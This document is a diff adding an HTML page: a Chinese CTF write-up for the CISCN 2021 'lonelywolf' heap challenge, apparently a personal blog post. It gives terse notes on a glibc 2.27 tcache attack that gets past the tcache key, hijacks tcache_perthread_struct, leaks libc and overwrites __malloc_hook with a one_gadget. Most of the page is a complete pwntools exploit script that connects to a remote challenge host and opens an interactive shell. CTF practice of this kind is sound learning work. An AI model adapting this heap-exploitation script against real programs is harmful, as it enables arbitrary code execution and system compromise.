@@ -1,0 +1,78 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>具有key的高版本tcache attack初体验</title>
+</head>
+<body>
+<b>具有key的高版本tcache attack初体验</b><br>
+<small>2025-04-20</small>
+<hr>
+<blockquote>
+<p>Problem: <a href="https://www.nssctf.cn/problem/856">[CISCN 2021 初赛]lonelywolf</a></p>
+</blockquote>
+<br><b><a href="#思路"></a>思路</b><br>
+<p>先double free拿到chunk地址<br>要点是libc2.27后期有key 需要先清空fd<br>泄露了可以拿到tcache_pthread_struct<br>然后改idx为7认为满了 释放tcache_pthread_struct 然后拿到main_arena 得到Libc_base<br>然后修复一下结构 比如0x80的idx 和0x80对应chunk的地址改成malloc_hook - 0x17 这个的size位是7d可以用<br>然后就写脏数据到__malloc_hook<br>写一个One_gadget 然后直接调用malloc完成getshell</p>
+<br><b><a href="#EXP"></a>EXP</b><br>
+<pre><code>  from pwn import *
+context.log_level = &#x27;debug&#x27;
+p = remote(&quot;node4.anna.nssctf.cn&quot;,28937)
+#p = process(&quot;./lonelywolf&quot;)
+e = ELF(&#x27;./lonelywolf&#x27;)
+libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.27-3ubuntu1.6_amd64/libc-2.27.so&#x27;)
+
+def new(idx,size):
+    p.sendlineafter(b&#x27;Your choice: &#x27;,str(1))
+    p.sendlineafter(b&#x27;Index:&#x27;,str(0))
+    p.sendlineafter(b&#x27;Size:&#x27;,str(size))
+
+def edit(idx,content):
+    p.sendlineafter(b&#x27;Your choice: &#x27;,str(2))
+    p.sendlineafter(b&#x27;Index:&#x27;,str(idx))
+    p.sendlineafter(b&#x27;Content: &#x27;,content)
+
+def show(idx):
+    p.sendlineafter(b&#x27;Your choice: &#x27;,str(3))
+    p.sendlineafter(b&#x27;Index:&#x27;,str(idx))
+
+def free(idx):
+    p.sendlineafter(b&#x27;Your choice: &#x27;,str(4))
+    p.sendlineafter(b&#x27;Index:&#x27;,str(idx))
+
+new(0,0x78)
+free(0)
+edit(0,b&#x27;a&#x27;*16) #清掉fd bk 有key不能double free
+free(0)
+show(0)
+p.recvuntil(b&quot;Content: &quot;)
+heap_address = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))
+log.success(&quot;leak head_address=&gt;&quot;+hex(heap_address))
+tcache_struct_addr = heap_address &amp; 0xFFFFFFFFF000 #拿到结构地址
+log.success(&quot;leak tcache_struct_addr=&gt;&quot;+hex(tcache_struct_addr))
+edit(0,p64(tcache_struct_addr+0x10)) #改fd成结构地址
+new(0,0x78)
+new(0,0x78)
+edit(0,p64(0)*4+p64(0x7000000)) #让idx变成7 认为满了
+free(0)
+show(0)
+p.recvuntil(b&quot;Content: &quot;)
+libc_base = u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;)) - 96 - 0x10 - libc.sym[&quot;__malloc_hook&quot;]
+malloc = libc_base + libc.sym[&quot;__malloc_hook&quot;]
+log.success(&quot;leak libc_base=&gt;&quot;+hex(libc_base))
+log.success(&quot;leak malloc=&gt;&quot;+hex(malloc))
+edit(0,p64(0x1000000000000)+p64(0)*13+p64(libc_base + libc.sym[&quot;__malloc_hook&quot;] - 0x17)) #0x17 size位7d 可以用 (恢复idx为1的0x80字段) + padding + malloc_hook的fake chunk 地址
+new(0,0x78)
+og=[0x10a41c,0x4f302,0xe54f7,0xe54fe,0xe5502,0x10a2fc,0x10a308]
+edit(0,b&#x27;a&#x27;*0x17+p64(libc_base+og[0]))
+new(0,0x78)
+#attach(p)
+p.interactive()</code></pre>
+
+<br><b><a href="#总结"></a>总结</b><br>
+<ul>
+<li>对该题的考点总结</li>
+</ul>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
